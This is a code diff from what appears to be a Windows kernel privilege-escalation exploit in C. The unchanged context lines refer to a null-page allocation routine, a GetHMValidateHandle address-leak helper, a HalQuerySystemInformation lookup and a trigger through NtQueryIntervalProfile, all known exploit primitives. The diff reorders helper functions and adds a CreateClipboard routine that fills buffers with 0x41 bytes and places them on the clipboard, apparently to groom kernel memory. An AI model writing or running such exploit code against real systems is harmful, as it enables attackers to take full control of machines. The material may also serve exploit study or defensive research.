@@ -3,6 +3,11 @@
 #define PAGE_SIZE 0x1000
 #define KERNEL_NAME_LENGTH 0X0D
 
+void ShowError(char *msg, DWORD dwErrorCode)
+{
+	printf("%s Error 0x%X\n", msg, dwErrorCode);
+}
+
 BOOL AllocateZeroMemory()
 {
 	NTSTATUS status = STATUS_SUCCESS;
@@ -129,6 +134,24 @@ exit:
 	return pXHalQuerySystemInformation;
 }
 
+BOOL CallNtQueryIntervalProfile()
+{
+	BOOL bRet = TRUE;
+	NTSTATUS status = STATUS_SUCCESS;
+
+
+	status = NtQueryIntervalProfile(ProfileTotalIssues, NULL);
+	if (!NT_SUCCESS(status))
+	{
+		ShowError("NtQueryIntervalProfile", status);
+		bRet = FALSE;
+		goto exit;
+	}
+
+exit:
+	return bRet;
+}
+
 PVOID GetHMValidateHandle()
 {
 	PVOID pFuncAddr = NULL;
@@ -164,25 +187,36 @@ exit:
 	return pFuncAddr;
 }
 
-BOOL CallNtQueryIntervalProfile()
+BOOL CreateClipboard(DWORD dwSize)
 {
 	BOOL bRet = TRUE;
-	NTSTATUS status;
+	PCHAR pBuffer = NULL;
+	HGLOBAL hMem = NULL;
 
-
-	status = NtQueryIntervalProfile(ProfileTotalIssues, NULL);
-	if (!NT_SUCCESS(status))
+	pBuffer = (PCHAR)malloc(dwSize);
+	if (!pBuffer)
 	{
-		ShowError("NtQueryIntervalProfile", status);
+		ShowError("malloc", GetLastError());
 		bRet = FALSE;
 		goto exit;
 	}
 
+	ZeroMemory(pBuffer, dwSize);
+	FillMemory(pBuffer, dwSize, 0x41);
+
+	hMem = GlobalAlloc(GMEM_MOVEABLE, dwSize);
+	if (hMem == NULL)
+	{
+		ShowError("GlobalAlloc", GetLastError());
+		bRet = FALSE;
+		goto exit;
+	}
+
+	CopyMemory(GlobalLock(hMem), pBuffer, dwSize);
+
+	GlobalUnlock(hMem);
+
+	SetClipboardData(CF_TEXT, hMem);
 exit:
 	return bRet;
-}
-
-void ShowError(char *msg, DWORD dwErrorCode)
-{
-	printf("%s Error 0x%X\n", msg, dwErrorCode);
 }
